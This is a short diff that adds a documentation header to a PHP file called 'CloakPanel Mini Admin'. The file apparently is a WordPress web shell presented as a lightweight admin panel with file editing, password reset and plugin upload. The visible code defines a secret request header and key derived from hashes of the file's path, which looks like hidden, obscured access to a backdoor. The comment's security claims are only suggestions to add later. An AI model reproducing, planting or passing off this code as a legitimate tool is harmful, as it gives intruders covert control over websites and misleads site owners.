@@ -1,4 +1,29 @@
 <?php
+/*
+ * CloakPanel Mini Admin v1.0.1
+ * PHP & JavaScript based lightweight admin interface
+ * Authored    : privdayz.com
+ *
+ * FEATURES
+ *  - File manager (browse, edit, delete, upload)
+ *  - User list & password reset
+ *  - Plugin control (activate/deactivate/delete/upload)
+ *  - Database info & optional Adminer loader
+ *
+ * REQUIREMENTS
+ *  - WordPress installation (wp-load.php must be reachable)
+ *  - PHP 7.4+ with JSON, mysqli extensions
+ *
+ * SECURITY
+ *  - Access restricted to administrators only (add current_user_can checks)
+ *  - CSRF protection via WP nonces (check_ajax_referer)
+ *  - Directory traversal prevention with realpath + base-path checks
+ *
+ * DISCLAIMER
+ *  - This script grants broad control over your WP install.
+ *  - Use at your own risk; the author takes no responsibility for misuse.
+ *  - Always audit & harden before deploying on production.
+ */
 session_start();
 define('CL_HEADER', 'HTTP_X_' . strtoupper(substr(md5(__FILE__), 4, 8)));
 define('CL_KEY', substr(sha1(__DIR__), 8, 12));
